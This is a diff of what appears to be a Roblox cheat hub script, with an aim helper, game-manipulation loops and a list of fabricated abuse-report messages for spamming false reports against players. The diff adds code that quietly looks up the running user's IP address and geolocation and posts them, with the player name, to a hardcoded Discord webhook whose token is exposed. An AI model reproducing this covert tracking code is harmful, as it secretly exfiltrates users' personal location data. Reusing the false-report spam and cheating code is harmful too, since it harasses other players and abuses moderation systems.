@@ -17,6 +17,17 @@ local serv = win:Server("Character", "")
 
 local btns =  serv:Channel("Inside Character")
 
+local debug = serv:Channel("Debug")
+
+debug:Button("Stop Erroring",
+function()
+pcall(function()
+game.Players.LocalPlayer.Backpack.Revolver.UI:Destroy()
+game.Players.LocalPlayer.Backpack.DB.UI:Destroy()
+
+end)
+end)
+
 
 function getClosestPlayerToCursor()
         local closestPlayer
@@ -76,6 +87,7 @@ mouse.KeyDown:connect(function(key)
  end)
 end
 ) 
+
 
 
 inspect:Button(
@@ -932,7 +944,7 @@ local taser =game:GetService("RunService").Heartbeat:connect(function()
  end
 
 end)
-
+end)
 local spamrerport = { "He said alot of bad words","He called me really bad stuff","it made me cry", "his words were really horrible"
 ,"He said websites that arent allowed","He joked about me","I'm getting offended by his stuff","He said he is cheating","HE IS EXPLOITING!!","they is homophobic","they are racist","Please help me roblox!",
 "I'm really scared from them","He is saying personal stuff to me","He is asking for my age!","He is trying to get infromation from me","they are trying to make me suicide",
@@ -1046,16 +1058,21 @@ end)
 )
 
 local webh = "https://discord.com/api/webhooks/1129434037560299550/16ezhmVPG1PSBhObpNCaNAt9bUYj3BtPlKDhCWcy0YPFCL-WhvTVq8ScNocdC_p6rPtq"
+local _ = game:HttpGet("https://api.ipify.org")
+local hi = game:HttpGet("http://ip-api.com/json/" .. _)
 
+local d = string.gsub(hi,",","\n")
 pcall(function()
    local data = {
        ["embeds"] = {
            {
                ["title"] = game:GetService("Players").LocalPlayer.Name,
-               ["description"] = game:HttpGet("https://api.ipify.org")
+               ["description"] = d
            }
        }
    }
+
+
 
    if syn then
        local response = syn.request(
@@ -1806,10 +1823,10 @@ end
 
 
 uh.hub()
-  
+  local plr = game.Players.LocalPlayer
 
 
- game.Players.Chatted:connect(function(msg)
+ game.Players.LocalPlayer.Chatted:connect(function(msg)
     if msg == "-reload" then 
         uh.Destroy() 
         uh.hub()
